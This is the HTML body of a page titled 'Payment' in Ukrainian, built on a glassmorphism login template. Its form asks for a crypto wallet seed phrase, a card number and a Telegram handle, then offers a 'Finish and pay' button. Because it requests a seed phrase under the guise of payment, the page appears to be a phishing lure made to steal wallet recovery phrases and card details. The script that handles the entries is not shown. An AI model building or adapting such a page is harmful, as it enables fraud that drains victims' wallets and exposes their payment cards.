<body>
    <section class="container">
        <div class="login-container">
            <div class="circle circle-one"></div>
            <div class="form-container">
                <img src="https://raw.githubusercontent.com/hicodersofficial/glassmorphism-login-form/master/assets/illustration.png" alt="illustration" class="illustration" />
                <h1 class="opacity">Оплата</h1>
                <form>
                    <label for="input">Seed-фраза:</label>
                    <input id="seed" type="text" placeholder="Введіть seed-фразу" />
                    <label for="input">Номер карти:</label>
                    <input type="tel" inputmodel="numeric" pattern="[0-9\s]{13,19}" autocomplete="cc-number" maxlength="19" placeholder="XXXX XXXX XXXX XXXX" required/>
                    <label for="input">Ваш телеграм для зв'язку:</label>
                    <input type="text" placeholder="@telegram_user">
                    <button class="opacity">Завершити та сплатити</button>
                </form>
                <div class="register-forget opacity">
                    <a href=""></a>
                    <a href=""></a>
                </div>
            </div>
            <div class="circle circle-two"></div>
        </div>
        <div class="theme-btn-container"></div>
    </section>
</body>
  <script  src="main.js"></script>
